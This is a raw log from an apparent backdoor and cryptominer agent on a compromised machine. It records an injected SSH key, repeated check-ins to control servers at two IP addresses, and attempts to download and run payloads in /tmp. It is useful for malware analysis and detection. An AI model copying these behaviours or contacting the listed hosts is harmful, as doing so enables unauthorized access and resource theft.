nohup: 忽略输入
I0615 12:27:41.691108   17737 backdoor.go:61] inject ssh key successfully
I0615 12:43:31.693469   17737 main.go:110] try hub: 67.207.95.103:8000
I0615 12:43:31.693553   17737 main.go:33] pingpong: 67.207.95.103:8000
I0615 12:43:31.693593   17737 report.go:46] empty baselist
I0615 12:43:31.922213   17737 miner.go:108] new config: [{XRun:{Exe:/tmp/Donald Url:/static/Donald Md5:0f8c0d79ad9f258f8aa56c38968a18f0}} {XRun:{Exe:/tmp/Trump Url:/static/Trump Md5:ed3ddd57d2486b11e52a8ae4c8be8ace}}]
I0615 12:43:31.922288   17737 base.go:79] Cmd(1) has processed at 2019-06-15 12:36:32 +0800 CST
I0615 12:43:31.924547   17737 base.go:79] Cmd(854) has processed at 2019-06-15 12:36:32 +0800 CST
I0615 12:43:31.926296   17737 base.go:79] Cmd(850) has processed at 2019-06-15 12:36:32 +0800 CST
I0615 12:43:31.927987   17737 base.go:79] Cmd(868) has processed at 2019-06-15 12:36:32 +0800 CST
I0615 12:43:31.929699   17737 base.go:79] Cmd(818) has processed at 2019-06-15 12:36:32 +0800 CST
I0615 12:43:31.931244   17737 base.go:79] Cmd(875) has processed at 2019-06-15 12:36:32 +0800 CST
I0615 12:43:41.693875   17737 main.go:110] try hub: 67.207.95.103:8000
I0615 12:43:41.693938   17737 main.go:33] pingpong: 67.207.95.103:8000
I0615 12:43:41.693964   17737 report.go:46] empty baselist
I0615 12:43:41.923093   17737 miner.go:108] new config: [{XRun:{Exe:/tmp/Donald Url:/static/Donald Md5:0f8c0d79ad9f258f8aa56c38968a18f0}} {XRun:{Exe:/tmp/Trump Url:/static/Trump Md5:ed3ddd57d2486b11e52a8ae4c8be8ace}}]
I0615 12:43:41.923167   17737 base.go:79] Cmd(1) has processed at 2019-06-15 12:36:32 +0800 CST
I0615 12:43:41.927423   17737 base.go:79] Cmd(854) has processed at 2019-06-15 12:36:32 +0800 CST
I0615 12:43:41.929558   17737 base.go:79] Cmd(850) has processed at 2019-06-15 12:36:32 +0800 CST
I0615 12:43:41.932075   17737 base.go:79] Cmd(868) has processed at 2019-06-15 12:36:32 +0800 CST
I0615 12:43:41.934986   17737 base.go:79] Cmd(818) has processed at 2019-06-15 12:36:32 +0800 CST
I0615 12:43:41.937099   17737 base.go:79] Cmd(875) has processed at 2019-06-15 12:36:32 +0800 CST
I0615 12:43:51.693177   17737 main.go:110] try hub: 67.207.95.103:8000
I0615 12:43:51.693270   17737 main.go:33] pingpong: 67.207.95.103:8000
I0615 12:43:51.693310   17737 report.go:46] empty baselist
I0615 12:43:51.926538   17737 miner.go:108] new config: [{XRun:{Exe:/tmp/Donald Url:/static/Donald Md5:0f8c0d79ad9f258f8aa56c38968a18f0}} {XRun:{Exe:/tmp/Trump Url:/static/Trump Md5:ed3ddd57d2486b11e52a8ae4c8be8ace}}]
I0615 12:43:51.926624   17737 base.go:79] Cmd(1) has processed at 2019-06-15 12:36:32 +0800 CST
I0615 12:43:51.929092   17737 base.go:79] Cmd(854) has processed at 2019-06-15 12:36:32 +0800 CST
I0615 12:43:51.931220   17737 base.go:79] Cmd(850) has processed at 2019-06-15 12:36:32 +0800 CST
I0615 12:43:51.933176   17737 base.go:79] Cmd(868) has processed at 2019-06-15 12:36:32 +0800 CST
I0615 12:43:51.935097   17737 base.go:79] Cmd(818) has processed at 2019-06-15 12:36:32 +0800 CST
I0615 12:43:51.940008   17737 base.go:79] Cmd(875) has processed at 2019-06-15 12:36:32 +0800 CST
I0615 12:44:01.693319   17737 main.go:110] try hub: 67.207.95.103:8000
I0615 12:44:01.693413   17737 main.go:33] pingpong: 67.207.95.103:8000
I0615 12:44:01.693453   17737 report.go:46] empty baselist
I0615 12:44:01.924204   17737 miner.go:108] new config: [{XRun:{Exe:/tmp/Donald Url:/static/Donald Md5:0f8c0d79ad9f258f8aa56c38968a18f0}} {XRun:{Exe:/tmp/Trump Url:/static/Trump Md5:ed3ddd57d2486b11e52a8ae4c8be8ace}}]
I0615 12:44:01.926195   17737 base.go:79] Cmd(1) has processed at 2019-06-15 12:36:32 +0800 CST
I0615 12:44:01.929846   17737 base.go:79] Cmd(854) has processed at 2019-06-15 12:36:32 +0800 CST
I0615 12:44:01.938688   17737 base.go:79] Cmd(850) has processed at 2019-06-15 12:36:32 +0800 CST
I0615 12:44:01.942862   17737 base.go:79] Cmd(868) has processed at 2019-06-15 12:36:32 +0800 CST
I0615 12:44:01.944996   17737 base.go:79] Cmd(818) has processed at 2019-06-15 12:36:32 +0800 CST
I0615 12:44:01.947005   17737 base.go:79] Cmd(875) has processed at 2019-06-15 12:36:32 +0800 CST
I0615 12:44:11.695790   17737 main.go:110] try hub: 103.219.112.66:8000
I0615 12:44:11.695875   17737 main.go:33] pingpong: 103.219.112.66:8000
I0615 12:44:11.695914   17737 report.go:46] empty baselist
I0615 12:44:11.702012   17737 main.go:119] Post http://103.219.112.66:8000/slave: dial tcp 103.219.112.66:8000: connect: connection refused: 103.219.112.66:8000
I0615 12:44:11.702166   17737 report.go:46] empty baselist
I0615 12:44:11.747152   17737 miner.go:108] new config: [{XRun:{Exe:/tmp/Donald Url:/static/Donald Md5:0f8c0d79ad9f258f8aa56c38968a18f0}} {XRun:{Exe:/tmp/Trump Url:/static/Trump Md5:ed3ddd57d2486b11e52a8ae4c8be8ace}}]
I0615 12:44:11.747448   17737 base.go:79] Cmd(1) has processed at 2019-06-15 12:36:32 +0800 CST
I0615 12:44:11.762672   17737 base.go:79] Cmd(854) has processed at 2019-06-15 12:36:32 +0800 CST
I0615 12:44:11.764828   17737 base.go:79] Cmd(850) has processed at 2019-06-15 12:36:32 +0800 CST
I0615 12:44:11.766753   17737 base.go:79] Cmd(868) has processed at 2019-06-15 12:36:32 +0800 CST
I0615 12:44:11.769721   17737 base.go:79] Cmd(818) has processed at 2019-06-15 12:36:32 +0800 CST
I0615 12:44:11.771747   17737 base.go:79] Cmd(875) has processed at 2019-06-15 12:36:32 +0800 CST
I0615 12:44:11.885862   17737 miner.go:93] pid not exists {{/tmp/Donald /static/Donald 0f8c0d79ad9f258f8aa56c38968a18f0}}
I0615 12:44:11.894911   17737 miner.go:93] pid not exists {{/tmp/Trump /static/Trump ed3ddd57d2486b11e52a8ae4c8be8ace}}
I0615 12:44:11.956044   17737 miner.go:101] fork/exec /tmp/Donald: exec format error: {XRun:{Exe:/tmp/Donald Url:/static/Donald Md5:0f8c0d79ad9f258f8aa56c38968a18f0}}
I0615 12:44:12.015148   17737 miner.go:101] fork/exec /tmp/Trump: exec format error: {XRun:{Exe:/tmp/Trump Url:/static/Trump Md5:ed3ddd57d2486b11e52a8ae4c8be8ace}}
I0615 12:44:21.693187   17737 main.go:110] try hub: 103.219.112.66:8000
I0615 12:44:21.693264   17737 main.go:113] skip 103.219.112.66:8000
I0615 12:44:21.693337   17737 report.go:46] empty baselist
I0615 12:44:21.734403   17737 miner.go:108] new config: [{XRun:{Exe:/tmp/Donald Url:/static/Donald Md5:0f8c0d79ad9f258f8aa56c38968a18f0}} {XRun:{Exe:/tmp/Trump Url:/static/Trump Md5:ed3ddd57d2486b11e52a8ae4c8be8ace}}]
I0615 12:44:21.734491   17737 base.go:79] Cmd(1) has processed at 2019-06-15 12:36:32 +0800 CST
I0615 12:44:21.736862   17737 base.go:79] Cmd(854) has processed at 2019-06-15 12:36:32 +0800 CST
I0615 12:44:21.738591   17737 base.go:79] Cmd(850) has processed at 2019-06-15 12:36:32 +0800 CST
I0615 12:44:21.740204   17737 base.go:79] Cmd(868) has processed at 2019-06-15 12:36:32 +0800 CST
I0615 12:44:21.742047   17737 base.go:79] Cmd(818) has processed at 2019-06-15 12:36:32 +0800 CST
I0615 12:44:21.743532   17737 base.go:79] Cmd(875) has processed at 2019-06-15 12:36:32 +0800 CST
I0615 12:44:31.693266   17737 report.go:46] empty baselist
I0615 12:44:31.733617   17737 miner.go:108] new config: [{XRun:{Exe:/tmp/Donald Url:/static/Donald Md5:0f8c0d79ad9f258f8aa56c38968a18f0}} {XRun:{Exe:/tmp/Trump Url:/static/Trump Md5:ed3ddd57d2486b11e52a8ae4c8be8ace}}]
I0615 12:44:31.734189   17737 base.go:79] Cmd(1) has processed at 2019-06-15 12:36:32 +0800 CST
I0615 12:44:31.737320   17737 base.go:79] Cmd(854) has processed at 2019-06-15 12:36:32 +0800 CST
I0615 12:44:31.741308   17737 base.go:79] Cmd(850) has processed at 2019-06-15 12:36:32 +0800 CST
I0615 12:44:31.743808   17737 base.go:79] Cmd(868) has processed at 2019-06-15 12:36:32 +0800 CST
I0615 12:44:31.745848   17737 base.go:79] Cmd(818) has processed at 2019-06-15 12:36:32 +0800 CST
I0615 12:44:31.747777   17737 base.go:79] Cmd(875) has processed at 2019-06-15 12:36:32 +0800 CST
I0615 12:44:41.693220   17737 main.go:110] try hub: 103.219.112.66:8000
I0615 12:44:41.694207   17737 main.go:113] skip 103.219.112.66:8000
I0615 12:44:41.695158   17737 report.go:46] empty baselist
I0615 12:44:41.740528   17737 miner.go:108] new config: [{XRun:{Exe:/tmp/Donald Url:/static/Donald Md5:0f8c0d79ad9f258f8aa56c38968a18f0}} {XRun:{Exe:/tmp/Trump Url:/static/Trump Md5:ed3ddd57d2486b11e52a8ae4c8be8ace}}]
I0615 12:44:41.741347   17737 base.go:79] Cmd(1) has processed at 2019-06-15 12:36:32 +0800 CST
I0615 12:44:41.743721   17737 base.go:79] Cmd(854) has processed at 2019-06-15 12:36:32 +0800 CST
I0615 12:44:41.745911   17737 base.go:79] Cmd(850) has processed at 2019-06-15 12:36:32 +0800 CST
I0615 12:44:41.747941   17737 base.go:79] Cmd(868) has processed at 2019-06-15 12:36:32 +0800 CST
I0615 12:44:41.749663   17737 base.go:79] Cmd(818) has processed at 2019-06-15 12:36:32 +0800 CST
I0615 12:44:41.751936   17737 base.go:79] Cmd(875) has processed at 2019-06-15 12:36:32 +0800 CST
I0615 12:44:51.693280   17737 main.go:110] try hub: 103.219.112.66:8000
I0615 12:44:51.693386   17737 main.go:113] skip 103.219.112.66:8000
I0615 12:44:51.693488   17737 report.go:46] empty baselist
I0615 12:44:51.729597   17737 miner.go:108] new config: [{XRun:{Exe:/tmp/Donald Url:/static/Donald Md5:0f8c0d79ad9f258f8aa56c38968a18f0}} {XRun:{Exe:/tmp/Trump Url:/static/Trump Md5:ed3ddd57d2486b11e52a8ae4c8be8ace}}]
I0615 12:44:51.729968   17737 base.go:79] Cmd(1) has processed at 2019-06-15 12:36:32 +0800 CST
I0615 12:44:51.732933   17737 base.go:79] Cmd(854) has processed at 2019-06-15 12:36:32 +0800 CST
I0615 12:44:51.735032   17737 base.go:79] Cmd(850) has processed at 2019-06-15 12:36:32 +0800 CST
I0615 12:44:51.736988   17737 base.go:79] Cmd(868) has processed at 2019-06-15 12:36:32 +0800 CST
I0615 12:44:51.738887   17737 base.go:79] Cmd(818) has processed at 2019-06-15 12:36:32 +0800 CST
I0615 12:44:51.741759   17737 base.go:79] Cmd(875) has processed at 2019-06-15 12:36:32 +0800 CST
I0615 12:45:01.693364   17737 report.go:46] empty baselist
I0615 12:45:01.731932   17737 miner.go:108] new config: [{XRun:{Exe:/tmp/Donald Url:/static/Donald Md5:0f8c0d79ad9f258f8aa56c38968a18f0}} {XRun:{Exe:/tmp/Trump Url:/static/Trump Md5:ed3ddd57d2486b11e52a8ae4c8be8ace}}]
I0615 12:45:01.732276   17737 base.go:79] Cmd(1) has processed at 2019-06-15 12:36:32 +0800 CST
I0615 12:45:01.734863   17737 base.go:79] Cmd(854) has processed at 2019-06-15 12:36:32 +0800 CST
I0615 12:45:01.737168   17737 base.go:79] Cmd(850) has processed at 2019-06-15 12:36:32 +0800 CST
I0615 12:45:01.738959   17737 base.go:79] Cmd(868) has processed at 2019-06-15 12:36:32 +0800 CST
I0615 12:45:01.740839   17737 base.go:79] Cmd(818) has processed at 2019-06-15 12:36:32 +0800 CST
I0615 12:45:01.743517   17737 base.go:79] Cmd(875) has processed at 2019-06-15 12:36:32 +0800 CST
I0615 12:45:11.693291   17737 main.go:110] try hub: 67.207.95.103:8000
I0615 12:45:11.693389   17737 main.go:33] pingpong: 67.207.95.103:8000
I0615 12:45:11.693428   17737 report.go:46] empty baselist
I0615 12:45:11.922598   17737 miner.go:108] new config: [{XRun:{Exe:/tmp/Donald Url:/static/Donald Md5:0f8c0d79ad9f258f8aa56c38968a18f0}} {XRun:{Exe:/tmp/Trump Url:/static/Trump Md5:ed3ddd57d2486b11e52a8ae4c8be8ace}}]
I0615 12:45:11.922692   17737 base.go:79] Cmd(1) has processed at 2019-06-15 12:36:32 +0800 CST
I0615 12:45:11.925268   17737 base.go:79] Cmd(854) has processed at 2019-06-15 12:36:32 +0800 CST
I0615 12:45:11.927750   17737 base.go:79] Cmd(850) has processed at 2019-06-15 12:36:32 +0800 CST
I0615 12:45:11.929753   17737 base.go:79] Cmd(868) has processed at 2019-06-15 12:36:32 +0800 CST
I0615 12:45:11.931829   17737 base.go:79] Cmd(818) has processed at 2019-06-15 12:36:32 +0800 CST
I0615 12:45:11.936782   17737 base.go:79] Cmd(875) has processed at 2019-06-15 12:36:32 +0800 CST
I0615 12:45:21.693222   17737 report.go:46] empty baselist
I0615 12:45:21.731761   17737 miner.go:108] new config: [{XRun:{Exe:/tmp/Donald Url:/static/Donald Md5:0f8c0d79ad9f258f8aa56c38968a18f0}} {XRun:{Exe:/tmp/Trump Url:/static/Trump Md5:ed3ddd57d2486b11e52a8ae4c8be8ace}}]
I0615 12:45:21.733771   17737 base.go:79] Cmd(1) has processed at 2019-06-15 12:36:32 +0800 CST
I0615 12:45:21.738928   17737 base.go:79] Cmd(854) has processed at 2019-06-15 12:36:32 +0800 CST
I0615 12:45:21.742569   17737 base.go:79] Cmd(850) has processed at 2019-06-15 12:36:32 +0800 CST
I0615 12:45:21.745079   17737 base.go:79] Cmd(868) has processed at 2019-06-15 12:36:32 +0800 CST
I0615 12:45:21.747843   17737 base.go:79] Cmd(818) has processed at 2019-06-15 12:36:32 +0800 CST
I0615 12:45:21.750062   17737 base.go:79] Cmd(875) has processed at 2019-06-15 12:36:32 +0800 CST
I0615 12:45:31.693277   17737 main.go:110] try hub: 103.219.112.66:8000
I0615 12:45:31.693370   17737 main.go:113] skip 103.219.112.66:8000
I0615 12:45:31.693472   17737 report.go:46] empty baselist
I0615 12:45:31.736055   17737 miner.go:108] new config: [{XRun:{Exe:/tmp/Donald Url:/static/Donald Md5:0f8c0d79ad9f258f8aa56c38968a18f0}} {XRun:{Exe:/tmp/Trump Url:/static/Trump Md5:ed3ddd57d2486b11e52a8ae4c8be8ace}}]
I0615 12:45:31.738070   17737 base.go:79] Cmd(1) has processed at 2019-06-15 12:36:32 +0800 CST
I0615 12:45:31.741609   17737 base.go:79] Cmd(854) has processed at 2019-06-15 12:36:32 +0800 CST
I0615 12:45:31.744168   17737 base.go:79] Cmd(850) has processed at 2019-06-15 12:36:32 +0800 CST
I0615 12:45:31.746279   17737 base.go:79] Cmd(868) has processed at 2019-06-15 12:36:32 +0800 CST
I0615 12:45:31.748730   17737 base.go:79] Cmd(818) has processed at 2019-06-15 12:36:32 +0800 CST
I0615 12:45:31.750900   17737 base.go:79] Cmd(875) has processed at 2019-06-15 12:36:32 +0800 CST
I0615 12:45:41.694664   17737 report.go:46] empty baselist
I0615 12:45:41.766161   17737 miner.go:108] new config: [{XRun:{Exe:/tmp/Donald Url:/static/Donald Md5:0f8c0d79ad9f258f8aa56c38968a18f0}} {XRun:{Exe:/tmp/Trump Url:/static/Trump Md5:ed3ddd57d2486b11e52a8ae4c8be8ace}}]
I0615 12:45:41.766834   17737 base.go:79] Cmd(1) has processed at 2019-06-15 12:36:32 +0800 CST
I0615 12:45:41.769153   17737 base.go:79] Cmd(854) has processed at 2019-06-15 12:36:32 +0800 CST
I0615 12:45:41.771254   17737 base.go:79] Cmd(850) has processed at 2019-06-15 12:36:32 +0800 CST
I0615 12:45:41.773157   17737 base.go:79] Cmd(868) has processed at 2019-06-15 12:36:32 +0800 CST
I0615 12:45:41.776595   17737 base.go:79] Cmd(818) has processed at 2019-06-15 12:36:32 +0800 CST
I0615 12:45:41.778376   17737 base.go:79] Cmd(875) has processed at 2019-06-15 12:36:32 +0800 CST
I0615 12:45:51.693857   17737 report.go:46] empty baselist
I0615 12:45:51.727878   17737 miner.go:108] new config: [{XRun:{Exe:/tmp/Donald Url:/static/Donald Md5:0f8c0d79ad9f258f8aa56c38968a18f0}} {XRun:{Exe:/tmp/Trump Url:/static/Trump Md5:ed3ddd57d2486b11e52a8ae4c8be8ace}}]
I0615 12:45:51.727970   17737 base.go:79] Cmd(1) has processed at 2019-06-15 12:36:32 +0800 CST
I0615 12:45:51.733234   17737 base.go:79] Cmd(854) has processed at 2019-06-15 12:36:32 +0800 CST
I0615 12:45:51.744056   17737 base.go:79] Cmd(850) has processed at 2019-06-15 12:36:32 +0800 CST
I0615 12:45:51.745776   17737 base.go:79] Cmd(868) has processed at 2019-06-15 12:36:32 +0800 CST
I0615 12:45:51.747576   17737 base.go:79] Cmd(818) has processed at 2019-06-15 12:36:32 +0800 CST
I0615 12:45:51.749350   17737 base.go:79] Cmd(875) has processed at 2019-06-15 12:36:32 +0800 CST
I0615 12:46:01.693213   17737 report.go:46] empty baselist
I0615 12:46:01.727473   17737 miner.go:108] new config: [{XRun:{Exe:/tmp/Donald Url:/static/Donald Md5:0f8c0d79ad9f258f8aa56c38968a18f0}} {XRun:{Exe:/tmp/Trump Url:/static/Trump Md5:ed3ddd57d2486b11e52a8ae4c8be8ace}}]
I0615 12:46:01.727878   17737 base.go:79] Cmd(1) has processed at 2019-06-15 12:36:32 +0800 CST
I0615 12:46:01.731651   17737 base.go:79] Cmd(854) has processed at 2019-06-15 12:36:32 +0800 CST
I0615 12:46:01.739368   17737 base.go:79] Cmd(850) has processed at 2019-06-15 12:36:32 +0800 CST
I0615 12:46:01.741873   17737 base.go:79] Cmd(868) has processed at 2019-06-15 12:36:32 +0800 CST
I0615 12:46:01.745449   17737 base.go:79] Cmd(818) has processed at 2019-06-15 12:36:32 +0800 CST
I0615 12:46:01.747651   17737 base.go:79] Cmd(875) has processed at 2019-06-15 12:36:32 +0800 CST
I0615 12:46:11.693149   17737 report.go:46] empty baselist
I0615 12:46:11.726346   17737 miner.go:108] new config: [{XRun:{Exe:/tmp/Donald Url:/static/Donald Md5:0f8c0d79ad9f258f8aa56c38968a18f0}} {XRun:{Exe:/tmp/Trump Url:/static/Trump Md5:ed3ddd57d2486b11e52a8ae4c8be8ace}}]
I0615 12:46:11.726433   17737 base.go:79] Cmd(1) has processed at 2019-06-15 12:36:32 +0800 CST
I0615 12:46:11.731973   17737 base.go:79] Cmd(854) has processed at 2019-06-15 12:36:32 +0800 CST
I0615 12:46:11.733727   17737 base.go:79] Cmd(850) has processed at 2019-06-15 12:36:32 +0800 CST
I0615 12:46:11.735331   17737 base.go:79] Cmd(868) has processed at 2019-06-15 12:36:32 +0800 CST
I0615 12:46:11.737146   17737 base.go:79] Cmd(818) has processed at 2019-06-15 12:36:32 +0800 CST
I0615 12:46:11.739083   17737 base.go:79] Cmd(875) has processed at 2019-06-15 12:36:32 +0800 CST
I0615 12:46:21.693268   17737 main.go:110] try hub: 67.207.95.103:8000
I0615 12:46:21.693373   17737 main.go:33] pingpong: 67.207.95.103:8000
I0615 12:46:21.693415   17737 report.go:46] empty baselist
I0615 12:46:21.920858   17737 miner.go:108] new config: [{XRun:{Exe:/tmp/Donald Url:/static/Donald Md5:0f8c0d79ad9f258f8aa56c38968a18f0}} {XRun:{Exe:/tmp/Trump Url:/static/Trump Md5:ed3ddd57d2486b11e52a8ae4c8be8ace}}]
I0615 12:46:21.920935   17737 base.go:79] Cmd(1) has processed at 2019-06-15 12:36:32 +0800 CST
I0615 12:46:21.923117   17737 base.go:79] Cmd(854) has processed at 2019-06-15 12:36:32 +0800 CST
I0615 12:46:21.924628   17737 base.go:79] Cmd(850) has processed at 2019-06-15 12:36:32 +0800 CST
I0615 12:46:21.925935   17737 base.go:79] Cmd(868) has processed at 2019-06-15 12:36:32 +0800 CST
I0615 12:46:21.927554   17737 base.go:79] Cmd(818) has processed at 2019-06-15 12:36:32 +0800 CST
I0615 12:46:21.929000   17737 base.go:79] Cmd(875) has processed at 2019-06-15 12:36:32 +0800 CST
I0615 12:46:31.693407   17737 main.go:110] try hub: 67.207.95.103:8000
I0615 12:46:31.693860   17737 main.go:33] pingpong: 67.207.95.103:8000
I0615 12:46:31.694184   17737 report.go:46] empty baselist
I0615 12:46:31.928888   17737 miner.go:108] new config: [{XRun:{Exe:/tmp/Donald Url:/static/Donald Md5:0f8c0d79ad9f258f8aa56c38968a18f0}} {XRun:{Exe:/tmp/Trump Url:/static/Trump Md5:ed3ddd57d2486b11e52a8ae4c8be8ace}}]
I0615 12:46:31.928964   17737 base.go:79] Cmd(1) has processed at 2019-06-15 12:36:32 +0800 CST
I0615 12:46:31.931346   17737 base.go:79] Cmd(854) has processed at 2019-06-15 12:36:32 +0800 CST
I0615 12:46:31.933541   17737 base.go:79] Cmd(850) has processed at 2019-06-15 12:36:32 +0800 CST
I0615 12:46:31.935923   17737 base.go:79] Cmd(868) has processed at 2019-06-15 12:36:32 +0800 CST
I0615 12:46:31.938321   17737 base.go:79] Cmd(818) has processed at 2019-06-15 12:36:32 +0800 CST
I0615 12:46:31.944234   17737 base.go:79] Cmd(875) has processed at 2019-06-15 12:36:32 +0800 CST
I0615 12:46:41.693149   17737 main.go:110] try hub: 67.207.95.103:8000
I0615 12:46:41.694027   17737 main.go:33] pingpong: 67.207.95.103:8000
I0615 12:46:41.694342   17737 report.go:46] empty baselist
I0615 12:46:41.923476   17737 miner.go:108] new config: [{XRun:{Exe:/tmp/Donald Url:/static/Donald Md5:0f8c0d79ad9f258f8aa56c38968a18f0}} {XRun:{Exe:/tmp/Trump Url:/static/Trump Md5:ed3ddd57d2486b11e52a8ae4c8be8ace}}]
I0615 12:46:41.924089   17737 base.go:79] Cmd(1) has processed at 2019-06-15 12:36:32 +0800 CST
I0615 12:46:41.927421   17737 base.go:79] Cmd(854) has processed at 2019-06-15 12:36:32 +0800 CST
I0615 12:46:41.929901   17737 base.go:79] Cmd(850) has processed at 2019-06-15 12:36:32 +0800 CST
I0615 12:46:41.932384   17737 base.go:79] Cmd(868) has processed at 2019-06-15 12:36:32 +0800 CST
I0615 12:46:41.935070   17737 base.go:79] Cmd(818) has processed at 2019-06-15 12:36:32 +0800 CST
I0615 12:46:41.937578   17737 base.go:79] Cmd(875) has processed at 2019-06-15 12:36:32 +0800 CST
I0615 12:46:51.693209   17737 main.go:110] try hub: 67.207.95.103:8000
I0615 12:46:51.694203   17737 main.go:33] pingpong: 67.207.95.103:8000
I0615 12:46:51.694512   17737 report.go:46] empty baselist
I0615 12:46:52.160319   17737 miner.go:108] new config: [{XRun:{Exe:/tmp/Donald Url:/static/Donald Md5:0f8c0d79ad9f258f8aa56c38968a18f0}} {XRun:{Exe:/tmp/Trump Url:/static/Trump Md5:ed3ddd57d2486b11e52a8ae4c8be8ace}}]
I0615 12:46:52.161012   17737 base.go:79] Cmd(1) has processed at 2019-06-15 12:36:32 +0800 CST
I0615 12:46:52.163846   17737 base.go:79] Cmd(854) has processed at 2019-06-15 12:36:32 +0800 CST
I0615 12:46:52.165810   17737 base.go:79] Cmd(850) has processed at 2019-06-15 12:36:32 +0800 CST
I0615 12:46:52.167458   17737 base.go:79] Cmd(868) has processed at 2019-06-15 12:36:32 +0800 CST
I0615 12:46:52.169435   17737 base.go:79] Cmd(818) has processed at 2019-06-15 12:36:32 +0800 CST
I0615 12:46:52.171415   17737 base.go:79] Cmd(875) has processed at 2019-06-15 12:36:32 +0800 CST
I0615 12:47:01.698333   17737 main.go:110] try hub: 103.219.112.66:8000
I0615 12:47:01.698428   17737 main.go:113] skip 103.219.112.66:8000
I0615 12:47:01.698461   17737 main.go:110] try hub: 67.207.95.103:8000
I0615 12:47:01.698504   17737 main.go:33] pingpong: 67.207.95.103:8000
I0615 12:47:01.698540   17737 report.go:46] empty baselist
I0615 12:47:01.932575   17737 miner.go:108] new config: [{XRun:{Exe:/tmp/Donald Url:/static/Donald Md5:0f8c0d79ad9f258f8aa56c38968a18f0}} {XRun:{Exe:/tmp/Trump Url:/static/Trump Md5:ed3ddd57d2486b11e52a8ae4c8be8ace}}]
I0615 12:47:01.932651   17737 base.go:79] Cmd(1) has processed at 2019-06-15 12:36:32 +0800 CST
I0615 12:47:01.934834   17737 base.go:79] Cmd(854) has processed at 2019-06-15 12:36:32 +0800 CST
I0615 12:47:01.936468   17737 base.go:79] Cmd(850) has processed at 2019-06-15 12:36:32 +0800 CST
I0615 12:47:01.937996   17737 base.go:79] Cmd(868) has processed at 2019-06-15 12:36:32 +0800 CST
I0615 12:47:01.939425   17737 base.go:79] Cmd(818) has processed at 2019-06-15 12:36:32 +0800 CST
I0615 12:47:01.940678   17737 base.go:79] Cmd(875) has processed at 2019-06-15 12:36:32 +0800 CST
I0615 12:47:11.698818   17737 main.go:110] try hub: 67.207.95.103:8000
I0615 12:47:11.699735   17737 main.go:33] pingpong: 67.207.95.103:8000
I0615 12:47:11.700045   17737 report.go:46] empty baselist
I0615 12:47:11.833170   17737 miner.go:93] pid not exists {{/tmp/Donald /static/Donald 0f8c0d79ad9f258f8aa56c38968a18f0}}
I0615 12:47:11.843752   17737 miner.go:93] pid not exists {{/tmp/Trump /static/Trump ed3ddd57d2486b11e52a8ae4c8be8ace}}
I0615 12:47:11.919078   17737 miner.go:101] fork/exec /tmp/Donald: exec format error: {XRun:{Exe:/tmp/Donald Url:/static/Donald Md5:0f8c0d79ad9f258f8aa56c38968a18f0}}
I0615 12:47:11.967927   17737 miner.go:101] fork/exec /tmp/Trump: exec format error: {XRun:{Exe:/tmp/Trump Url:/static/Trump Md5:ed3ddd57d2486b11e52a8ae4c8be8ace}}
I0615 12:47:12.486063   17737 miner.go:108] new config: [{XRun:{Exe:/tmp/Donald Url:/static/Donald Md5:0f8c0d79ad9f258f8aa56c38968a18f0}} {XRun:{Exe:/tmp/Trump Url:/static/Trump Md5:ed3ddd57d2486b11e52a8ae4c8be8ace}}]
I0615 12:47:12.486742   17737 base.go:79] Cmd(1) has processed at 2019-06-15 12:36:32 +0800 CST
I0615 12:47:12.491162   17737 base.go:79] Cmd(854) has processed at 2019-06-15 12:36:32 +0800 CST
I0615 12:47:12.493987   17737 base.go:79] Cmd(850) has processed at 2019-06-15 12:36:32 +0800 CST
I0615 12:47:12.497422   17737 base.go:79] Cmd(868) has processed at 2019-06-15 12:36:32 +0800 CST
I0615 12:47:12.504591   17737 base.go:79] Cmd(818) has processed at 2019-06-15 12:36:32 +0800 CST
I0615 12:47:12.510048   17737 base.go:79] Cmd(875) has processed at 2019-06-15 12:36:32 +0800 CST
I0615 12:47:21.693150   17737 main.go:110] try hub: 67.207.95.103:8000
I0615 12:47:21.693243   17737 main.go:33] pingpong: 67.207.95.103:8000
I0615 12:47:21.693283   17737 report.go:46] empty baselist
I0615 12:47:21.926083   17737 miner.go:108] new config: [{XRun:{Exe:/tmp/Donald Url:/static/Donald Md5:0f8c0d79ad9f258f8aa56c38968a18f0}} {XRun:{Exe:/tmp/Trump Url:/static/Trump Md5:ed3ddd57d2486b11e52a8ae4c8be8ace}}]
I0615 12:47:21.926160   17737 base.go:79] Cmd(1) has processed at 2019-06-15 12:36:32 +0800 CST
I0615 12:47:21.928867   17737 base.go:79] Cmd(854) has processed at 2019-06-15 12:36:32 +0800 CST
I0615 12:47:21.930657   17737 base.go:79] Cmd(850) has processed at 2019-06-15 12:36:32 +0800 CST
